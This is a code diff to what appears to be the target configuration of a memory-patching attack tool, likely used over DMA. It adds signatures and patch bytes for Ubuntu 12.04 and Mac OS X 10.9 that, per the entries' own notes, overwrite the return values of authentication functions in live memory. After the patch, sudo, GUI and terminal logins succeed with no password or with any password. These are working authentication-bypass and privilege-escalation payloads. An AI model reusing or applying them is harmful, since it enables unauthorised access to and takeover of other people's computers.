@@ -64,7 +64,7 @@ success = True                  # Optimistic-by-nature setting
 encoding = None                 # System encoding
 vectorsize = 128                # Read vector size
 memdump = False                 # Memory dump mode off
-startaddress = 1970*MiB              # Default memory start address
+startaddress = 1*MiB              # Default memory start address
 dumpsize = False                # Not set by default
 interactive = False             # Interactive mode off
 max_request_size = PAGESIZE//2  # By default the max request size is the PSZ/2
@@ -299,7 +299,26 @@ targets = [{'OS': 'Windows 8',
                             'chunks': [{'chunk': 0x83f81f89c574,
                                         'internaloffset': 0x00,
                                         'patch': 0xbd00000000eb,
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Ubuntu 12.04',
+            'versions': ['12.04'],
+            'architectures': ['x64'],
+            'name': 'libpam unlock/privilege escalation',
+            'notes': 'Overwrites the pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
+            'signatures': [{'offsets': [0x3c8], # 12.04 x64
+                            'chunks': [{'chunk': 0x83f81f89c574,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xbf00000000eb,
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Mac OS X 10.9',
+            'versions': ['10.9'],
+            'architectures': ['x64'],
+            'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
+            'notes': 'Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
+            'signatures': [{'offsets': [0x1e5], # 10.9
+                            'chunks': [{'chunk': 0x4488e84883c4685b415c415d415e415f5d,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x90b001, # nop; mov al,1;
                                         'patchoffset': 0x00}]}]}]
-
 egg = False
 eggs = []
